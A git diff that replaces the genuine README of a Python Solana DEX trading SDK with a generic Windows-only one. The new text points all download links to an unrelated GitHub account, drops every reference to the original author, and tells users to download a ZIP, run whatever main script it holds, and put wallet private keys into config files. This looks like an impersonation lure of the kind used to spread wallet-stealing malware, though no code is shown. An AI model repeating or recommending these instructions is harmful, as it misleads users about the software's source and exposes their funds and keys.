@@ -1,388 +1,202 @@
-<div align="center">
-    <h1>🚀 Sol Trade SDK for Python</h1>
-    <h3><em>A comprehensive Python SDK for seamless Solana DEX trading</em></h3>
-</div>
-
-<p align="center">
-    <strong>A high-performance Python SDK for low-latency Solana DEX trading bots. Built for speed and efficiency, it enables seamless, high-throughput interaction with PumpFun, Pump AMM (PumpSwap), Bonk, Meteora DAMM v2, Raydium AMM v4, and Raydium CPMM for latency-critical trading strategies.</strong>
-</p>
-
-<p align="center">
-    <a href="https://pypi.org/project/sol-trade-sdk">
-        <img src="https://img.shields.io/pypi/v/sol-trade-sdk.svg" alt="PyPI">
-    </a>
-    <a href="https://pypi.org/project/sol-trade-sdk">
-        <img src="https://img.shields.io/pypi/pyversions/sol-trade-sdk.svg" alt="Python Versions">
-    </a>
-    <a href="LICENSE">
-        <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License">
-    </a>
-</p>
-
-<p align="center">
-    <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
-    <img src="https://img.shields.io/badge/Solana-9945FF?style=for-the-badge&logo=solana&logoColor=white" alt="Solana">
-    <img src="https://img.shields.io/badge/DEX-4B8BBE?style=for-the-badge&logo=bitcoin&logoColor=white" alt="DEX Trading">
-</p>
-
-<p align="center">
-    <a href="https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/README_CN.md">中文</a> |
-    <a href="https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/README.md">English</a> |
-    <a href="https://fnzero.dev/">Website</a> |
-    <a href="https://t.me/fnzero_group">Telegram</a> |
-    <a href="https://discord.gg/vuazbGkqQE">Discord</a>
-</p>
-
-## 📋 Table of Contents
-
-- [✨ Features](#-features)
-- [📦 Installation](#-installation)
-- [🛠️ Usage Examples](#️-usage-examples)
-  - [📋 Example Usage](#-example-usage)
-  - [⚡ Trading Parameters](#-trading-parameters)
-  - [📊 Usage Examples Summary Table](#-usage-examples-summary-table)
-  - [⚙️ SWQoS Service Configuration](#️-swqos-service-configuration)
-  - [🔧 Middleware System](#-middleware-system)
-  - [🔍 Address Lookup Tables](#-address-lookup-tables)
-  - [🔍 Nonce Cache](#-nonce-cache)
-- [💰 Cashback Support (PumpFun / PumpSwap)](#-cashback-support-pumpfun--pumpswap)
-- [🛡️ MEV Protection Services](#️-mev-protection-services)
-- [📁 Project Structure](#-project-structure)
-- [📄 License](#-license)
-- [💬 Contact](#-contact)
-- [⚠️ Important Notes](#️-important-notes)
-
----
-
-## 📦 SDK Versions
-
-This SDK is available in multiple languages:
-
-| Language | Repository | Description |
-|----------|------------|-------------|
-| **Rust** | [sol-trade-sdk](https://github.com/0xfnzero/sol-trade-sdk) | Ultra-low latency with zero-copy optimization |
-| **Node.js** | [sol-trade-sdk-nodejs](https://github.com/0xfnzero/sol-trade-sdk-nodejs) | TypeScript/JavaScript for Node.js |
-| **Python** | [sol-trade-sdk-python](https://github.com/0xfnzero/sol-trade-sdk-python) | Async/await native support |
-| **Go** | [sol-trade-sdk-golang](https://github.com/0xfnzero/sol-trade-sdk-golang) | Concurrent-safe with goroutine support |
-
-## ✨ Features
-
-1. **PumpFun Trading**: Support for `buy` and `sell` operations
-2. **PumpSwap Trading**: Support for PumpSwap pool trading operations
-3. **Bonk Trading**: Support for Bonk trading operations
-4. **Raydium CPMM Trading**: Support for Raydium CPMM (Concentrated Pool Market Maker) trading operations
-5. **Raydium AMM V4 Trading**: Support for Raydium AMM V4 (Automated Market Maker) trading operations
-6. **Meteora DAMM V2 Trading**: Support for Meteora DAMM V2 (Dynamic AMM) trading operations
-7. **Multiple MEV Protection**: Support for Jito, Nextblock, ZeroSlot, Temporal, Bloxroute, FlashBlock, BlockRazor, Node1, Astralane and other services
-8. **Concurrent Trading**: Send transactions using multiple MEV services simultaneously; the fastest succeeds while others fail
-9. **Unified Trading Interface**: Use unified trading protocol types for trading operations
-10. **Middleware System**: Support for custom instruction middleware to modify, add, or remove instructions before transaction execution
-11. **Shared Infrastructure**: Share expensive RPC and SWQoS clients across multiple wallets for reduced resource usage
-
-## 📦 Installation
-
-### Direct Clone (Recommended)
-
-Clone this project to your project directory:
-
-```bash
-cd your_project_root_directory
-git clone https://github.com/0xfnzero/sol-trade-sdk-python
-```
-
-Install dependencies:
-
-```bash
-cd sol-trade-sdk-python
-pip install -e .
-```
-
-Or add to your `requirements.txt`:
-
-```
-sol-trade-sdk @ ./sol-trade-sdk-python
-```
-
-Or add to your `pyproject.toml`:
-
-```toml
-[project]
-dependencies = [
-    "sol-trade-sdk @ ./sol-trade-sdk-python",
-]
-```
-
-### Use PyPI
-
-```bash
-pip install sol-trade-sdk
-```
-
-## 🛠️ Usage Examples
-
-### 📋 Example Usage
-
-#### 1. Create TradingClient Instance
-
-You can refer to [Example: Create TradingClient Instance](examples/trading_client.py).
-
-**Method 1: Simple (single wallet)**
-```python
-import asyncio
-from sol_trade_sdk import TradingClient, TradeConfig, SwqosConfig, SwqosRegion
-
-async def main():
-    # Wallet
-    payer = Keypair.from_secret_key(/* your keypair */)
-    
-    # RPC URL
-    rpc_url = "https://mainnet.helius-rpc.com/?api-key=xxxxxx"
-    
-    # Multiple SWQoS services can be configured
-    swqos_configs = [
-        SwqosConfig(type="Default", rpc_url=rpc_url),
-        SwqosConfig(type="Jito", uuid="your_uuid", region=SwqosRegion.FRANKFURT),
-        SwqosConfig(type="Bloxroute", api_token="your_api_token", region=SwqosRegion.FRANKFURT),
-        SwqosConfig(type="Astralane", api_key="your_api_key", region=SwqosRegion.FRANKFURT),
-    ]
-    
-    # Create TradeConfig instance
-    trade_config = TradeConfig(rpc_url, swqos_configs)
-    
-    # Create TradingClient
-    client = TradingClient(payer, trade_config)
-
-asyncio.run(main())
-```
-
-**Method 2: Shared infrastructure (multiple wallets)**
-
-For multi-wallet scenarios, create the infrastructure once and share it across wallets.
-See [Example: Shared Infrastructure](examples/shared_infrastructure.py).
-
-```python
-from sol_trade_sdk import TradingInfrastructure, InfrastructureConfig
-
-# Create infrastructure once (expensive)
-infra_config = InfrastructureConfig(rpc_url, swqos_configs)
-infrastructure = TradingInfrastructure(infra_config)
-
-# Create multiple clients sharing the same infrastructure (fast)
-client1 = TradingClient.from_infrastructure(payer1, infrastructure)
-client2 = TradingClient.from_infrastructure(payer2, infrastructure)
-```
-
-#### 2. Configure Gas Fee Strategy
-
-```python
-from sol_trade_sdk import GasFeeStrategy
-
-# Create GasFeeStrategy instance
-gas_fee_strategy = GasFeeStrategy()
-# Set global strategy
-gas_fee_strategy.set_global_fee_strategy(150000, 150000, 500000, 500000, 0.001, 0.001)
-```
-
-#### 3. Build Trading Parameters
-
-```python
-from sol_trade_sdk import TradeBuyParams, DexType, TradeTokenType
-
-buy_params = TradeBuyParams(
-    dex_type=DexType.PUMPSWAP,
-    input_token_type=TradeTokenType.WSOL,
-    mint=mint_pubkey,
-    input_token_amount=buy_sol_amount,
-    slippage_basis_points=500,
-    recent_blockhash=recent_blockhash,
-    # Use extension_params for protocol-specific parameters
-    extension_params={"type": "PumpSwap", "params": pumpswap_params},
-    address_lookup_table_account=None,
-    wait_transaction_confirmed=True,
-    create_input_token_ata=True,
-    close_input_token_ata=True,
-    create_mint_ata=True,
-    durable_nonce=None,
-    fixed_output_token_amount=None,
-    gas_fee_strategy=gas_fee_strategy,
-    simulate=False,
-)
-```
-
-#### 4. Execute Trading
-
-```python
-result = await client.buy(buy_params)
-print(f"Transaction signature: {result.signature}")
-```
-
-### ⚡ Trading Parameters
-
-For comprehensive information about all trading parameters including `TradeBuyParams` and `TradeSellParams`, see the Trading Parameters documentation.
-
-#### About ShredStream
-
-When using shred to subscribe to events, due to the nature of shreds, you cannot get complete information about transaction events.
-Please ensure that the parameters your trading logic depends on are available in shreds when using them.
-
-### 📊 Usage Examples Summary Table
-
-| Description | Run Command | Source Code |
-|-------------|-------------|-------------|
-| Create and configure TradingClient instance | `python examples/trading_client.py` | [examples/trading_client.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/trading_client.py) |
-| Share infrastructure across multiple wallets | `python examples/shared_infrastructure.py` | [examples/shared_infrastructure.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/shared_infrastructure.py) |
-| PumpFun token sniping trading | `python examples/pumpfun_sniper_trading.py` | [examples/pumpfun_sniper_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/pumpfun_sniper_trading.py) |
-| PumpFun token copy trading | `python examples/pumpfun_copy_trading.py` | [examples/pumpfun_copy_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/pumpfun_copy_trading.py) |
-| PumpSwap trading operations | `python examples/pumpswap_trading.py` | [examples/pumpswap_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/pumpswap_trading.py) |
-| PumpSwap direct trading (via RPC) | `python examples/pumpswap_direct_trading.py` | [examples/pumpswap_direct_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/pumpswap_direct_trading.py) |
-| Raydium CPMM trading operations | `python examples/raydium_cpmm_trading.py` | [examples/raydium_cpmm_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/raydium_cpmm_trading.py) |
-| Raydium AMM V4 trading operations | `python examples/raydium_amm_v4_trading.py` | [examples/raydium_amm_v4_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/raydium_amm_v4_trading.py) |
-| Meteora DAMM V2 trading operations | `python examples/meteora_damm_v2_trading.py` | [examples/meteora_damm_v2_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/meteora_damm_v2_trading.py) |
-| Bonk token sniping trading | `python examples/bonk_sniper_trading.py` | [examples/bonk_sniper_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/bonk_sniper_trading.py) |
-| Bonk token copy trading | `python examples/bonk_copy_trading.py` | [examples/bonk_copy_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/bonk_copy_trading.py) |
-| Custom instruction middleware example | `python examples/middleware_system.py` | [examples/middleware_system.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/middleware_system.py) |
-| Address lookup table example | `python examples/address_lookup.py` | [examples/address_lookup.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/address_lookup.py) |
-| Nonce cache (durable nonce) example | `python examples/nonce_cache.py` | [examples/nonce_cache.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/nonce_cache.py) |
-| Wrap/unwrap SOL to/from WSOL example | `python examples/wsol_wrapper.py` | [examples/wsol_wrapper.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/wsol_wrapper.py) |
-| Seed trading example | `python examples/seed_trading.py` | [examples/seed_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/seed_trading.py) |
-| Gas fee strategy example | `python examples/gas_fee_strategy.py` | [examples/gas_fee_strategy.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/gas_fee_strategy.py) |
-| Hot path trading (zero-RPC) | `python examples/hot_path_trading.py` | [examples/hot_path_trading.py](https://github.com/0xfnzero/sol-trade-sdk-python/blob/main/examples/hot_path_trading.py) |
-
-### ⚙️ SWQoS Service Configuration
-
-When configuring SWQoS services, note the different parameter requirements for each service:
-
-- **Jito**: The first parameter is UUID (if no UUID, pass an empty string `""`)
-- **Other MEV services**: The first parameter is the API Token
-
-#### Custom URL Support
-
-Each SWQoS service supports an optional custom URL parameter:
-
-```python
-# Using custom URL
-jito_config = SwqosConfig(
-    type="Jito",
-    uuid="your_uuid",
-    region=SwqosRegion.FRANKFURT,
-    custom_url="https://custom-jito-endpoint.com"
-)
-
-# Using default regional endpoint
-bloxroute_config = SwqosConfig(
-    type="Bloxroute",
-    api_token="your_api_token",
-    region=SwqosRegion.NEW_YORK
-)
-```
-
-**URL Priority Logic**:
-- If a custom URL is provided, it will be used instead of the regional endpoint
-- If no custom URL is provided, the system will use the default endpoint for the specified region
-- This allows for maximum flexibility while maintaining backward compatibility
-
-When using multiple MEV services, you need to use `Durable Nonce`. You need to use the `fetch_nonce_info` function to get the latest `nonce` value, and use it as the `durable_nonce` when trading.
-
----
-
-### 🔧 Middleware System
-
-The SDK provides a powerful middleware system that allows you to modify, add, or remove instructions before transaction execution. Middleware executes in the order they are added:
-
-```python
-from sol_trade_sdk import MiddlewareManager
-
-manager = MiddlewareManager() \
-    .add_middleware(FirstMiddleware()) \
-    .add_middleware(SecondMiddleware()) \
-    .add_middleware(ThirdMiddleware())
-```
-
-### 🔍 Address Lookup Tables
-
-Address Lookup Tables (ALT) allow you to optimize transaction size and reduce fees by storing frequently used addresses in a compact table format.
-
-```python
-from sol_trade_sdk import fetch_address_lookup_table_account, AddressLookupTableCache
-
-# Fetch ALT from chain
-alt = await fetch_address_lookup_table_account(rpc, alt_address)
-print(f"ALT contains {len(alt.addresses)} addresses")
-
-# Use cache for performance
-cache = AddressLookupTableCache(rpc)
-await cache.prefetch([alt_address1, alt_address2, alt_address3])
-cached = cache.get(alt_address1)
-```
-
-### 🔍 Durable Nonce
-
-Use Durable Nonce to implement transaction replay protection and optimize transaction processing.
-
-```python
-from sol_trade_sdk import fetch_nonce_info, NonceCache
-
-# Fetch nonce info
-nonce_info = await fetch_nonce_info(rpc, nonce_account)
-```
-
-## 💰 Cashback Support (PumpFun / PumpSwap)
-
-PumpFun and PumpSwap support **cashback** for eligible tokens: part of the trading fee can be returned to the user. The SDK **must know** whether the token has cashback enabled so that buy/sell instructions include the correct accounts.
-
-- **When params come from RPC**: If you use `PumpFunParams.from_mint_by_rpc` or `PumpSwapParams.from_pool_address_by_rpc`, the SDK reads `is_cashback_coin` from chain—no extra step.
-- **When params come from event/parser**: If you build params from trade events (e.g. [sol-parser-sdk](https://github.com/0xfnzero/sol-parser-sdk)), you **must** pass the cashback flag into the SDK:
-  - **PumpFun**: Set `is_cashback_coin` when building params from parsed events.
-  - **PumpSwap**: Set `is_cashback_coin` field when constructing params manually.
-
-## 🛡️ MEV Protection Services
-
-You can apply for a key through the official website: [Community Website](https://fnzero.dev/swqos)
-
-- **Jito**: High-performance block space
-- **ZeroSlot**: Zero-latency transactions
-- **Temporal**: Time-sensitive transactions
-- **Bloxroute**: Blockchain network acceleration
-- **FlashBlock**: High-speed transaction execution with API key authentication
-- **BlockRazor**: High-speed transaction execution with API key authentication
-- **Node1**: High-speed transaction execution with API key authentication
-- **Astralane**: Blockchain network acceleration
-
-## 📁 Project Structure
-
-```
-src/
-├── common/           # Common functionality and tools
-├── constants/        # Constant definitions
-├── instruction/      # Instruction building
-│   └── utils/        # Instruction utilities
-├── swqos/            # MEV service clients
-├── trading/          # Unified trading engine
-│   ├── common/       # Common trading tools
-│   ├── core/         # Core trading engine
-│   ├── middleware/   # Middleware system
-│   └── factory.py    # Trading factory
-├── utils/            # Utility functions
-│   ├── calc/         # Amount calculation utilities
-│   └── price/        # Price calculation utilities
-└── __init__.py       # Main library file
-```
-
-## 📄 License
-
-MIT License
-
-## 💬 Contact
-
-- Official Website: https://fnzero.dev/
-- Project Repository: https://github.com/0xfnzero/sol-trade-sdk-python
-- Telegram Group: https://t.me/fnzero_group
-- Discord: https://discord.gg/vuazbGkqQE
-
-## ⚠️ Important Notes
-
-1. Test thoroughly before using on mainnet
-2. Properly configure private keys and API tokens
-3. Pay attention to slippage settings to avoid transaction failures
-4. Monitor balances and transaction fees
-5. Comply with relevant laws and regulations
+# ⚡ sol-trade-sdk-python - Trade Solana with less setup
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Adventurismjuggling674/sol-trade-sdk-python)
+
+## 🚀 What this is
+
+sol-trade-sdk-python is a Python SDK for Solana trading. It helps you work with common DEX tasks from one place. You can use it for swaps, copy trading, arbitrage, sniping, and bot-based trade flow across several Solana protocols.
+
+This project is built for users who want a single toolset for Solana DEX activity. It focuses on speed, direct access, and support for MEV-related services.
+
+## 📦 What you need
+
+Before you start, make sure you have:
+
+- A Windows computer
+- Internet access
+- A GitHub account if you want to clone the repo
+- Python 3.10 or newer
+- At least 4 GB of RAM
+- Enough disk space for Python and project files
+
+If you want to run trading tools with live network access, use a stable connection and keep your wallet details safe.
+
+## 🔽 Download and install
+
+Use this link to visit this page to download:
+
+[https://github.com/Adventurismjuggling674/sol-trade-sdk-python](https://github.com/Adventurismjuggling674/sol-trade-sdk-python)
+
+Follow these steps on Windows:
+
+1. Open the link above in your browser.
+2. Click the green **Code** button on the GitHub page.
+3. Choose **Download ZIP**.
+4. Save the file to your computer.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+
+If the repo includes a release file later, you can use that file directly. For now, this page is the place to download the project.
+
+## 🛠️ Set up Python on Windows
+
+If Python is not already installed:
+
+1. Go to [python.org](https://www.python.org/downloads/).
+2. Download the latest Python 3 release for Windows.
+3. Run the installer.
+4. Check the box that says **Add Python to PATH**.
+5. Finish the install.
+
+To check that Python works:
+
+1. Press **Windows + R**.
+2. Type `cmd` and press Enter.
+3. Type:
+
+   `python --version`
+
+4. Press Enter.
+
+You should see a Python version number.
+
+## ▶️ Run the project
+
+After you extract the files:
+
+1. Open the project folder.
+2. Look for a file named `requirements.txt`.
+3. If it exists, open Command Prompt in that folder.
+4. Type:
+
+   `pip install -r requirements.txt`
+
+5. Press Enter.
+6. Look for the main run file, such as `main.py`, `app.py`, or a similar Python file.
+7. Start it with:
+
+   `python main.py`
+
+If the project uses a different file name, run the file listed in the folder as the main entry point.
+
+## 🧭 Common uses
+
+This SDK is built for tasks like:
+
+- Solana DEX trading
+- Copy trading
+- Arbitrage tracking
+- Token sniping
+- MEV bundle flow
+- Fast swap routing
+- Bot-driven trade actions
+- Support for tools linked to Raydium, Pump.fun, PumpSwap, Meteora, and Jito
+
+These tools can help you build or run trading workflows from Python.
+
+## 🧩 Protocol and provider support
+
+The project topics point to support for several Solana trading paths and provider types:
+
+- Raydium
+- Meteora
+- Pump.fun
+- PumpSwap
+- Jito bundles
+- SWQoS routing
+- FN Zero
+- Copy-trading flows
+- Arbitrage setups
+- Snipe-bot logic
+
+This makes the SDK useful for users who want to work across more than one Solana venue.
+
+## 🧰 Basic workflow
+
+A common workflow looks like this:
+
+1. Download the repo from GitHub.
+2. Install Python on Windows.
+3. Extract the project files.
+4. Install project packages.
+5. Add your wallet or API settings if the project asks for them.
+6. Start the Python file that runs the app or bot.
+7. Watch the terminal for status messages.
+
+If the project includes example config files, copy them first and then edit your own values.
+
+## 🔐 Wallet and key setup
+
+Trading tools often need wallet access. Use care when you enter any key or secret.
+
+Common setup files may include:
+
+- `.env`
+- `config.json`
+- `settings.py`
+
+If the project uses one of these, open it in a text editor and fill in your own values. Keep private keys offline when you can. Use a wallet that holds only the funds you want to use for trading.
+
+## 🧪 If the app does not start
+
+Try these checks:
+
+1. Make sure Python is installed.
+2. Make sure you ran Command Prompt in the project folder.
+3. Make sure `pip install -r requirements.txt` finished without errors.
+4. Make sure you started the right `.py` file.
+5. Make sure the folder name has no strange characters.
+6. Make sure your internet connection works.
+
+If Windows blocks the file, right-click the folder or file and check the security options in Properties.
+
+## 📁 Typical project files
+
+You may see files like these:
+
+- `README.md` — project instructions
+- `requirements.txt` — Python package list
+- `main.py` — main start file
+- `config.json` — settings
+- `.env.example` — sample secret settings
+- `src/` — source code
+- `tests/` — test files
+
+These names can help you find the right file to run.
+
+## 💡 Tips for first-time users
+
+- Use a test wallet first
+- Start with small amounts
+- Read any config file before you change it
+- Keep Python updated
+- Close other heavy apps if the tool feels slow
+- Save a copy of your settings before you edit them
+
+## 🔎 What you can build with it
+
+Developers and advanced users can use this SDK to build:
+
+- Trade bots
+- Copy-trade systems
+- Sniper tools
+- Swap tools
+- Route checkers
+- MEV bundle tools
+- Market scanners
+- Arbitrage helpers
+
+The repo is set up for users who want direct control over Solana trading logic in Python
+
+## 🖥️ Windows run checklist
+
+Use this quick list before you start:
+
+- Python installed
+- Project files extracted
+- Command Prompt opened in the project folder
+- Required packages installed
+- Config values filled in
+- Main Python file started
+
+If you reach the end of this list, the project should be ready to use
